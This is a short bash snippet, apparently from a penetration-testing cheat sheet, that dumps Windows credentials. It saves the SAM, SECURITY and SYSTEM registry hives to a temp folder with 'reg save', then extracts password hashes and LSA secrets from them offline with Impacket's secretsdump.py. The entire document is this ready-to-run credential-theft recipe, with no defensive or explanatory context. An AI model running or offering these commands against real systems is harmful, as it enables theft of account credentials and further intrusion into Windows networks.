```bash
reg save HKLM\SAM "C:\Windows\Temp\sam.save"
reg save HKLM\SECURITY "C:\Windows\Temp\security.save"
reg save HKLM\SYSTEM "C:\Windows\Temp\system.save"

secretsdump.py -sam '/path/to/sam.save' -system '/path/to/system.save' -security '/path/to/security.save' LOCAL
```

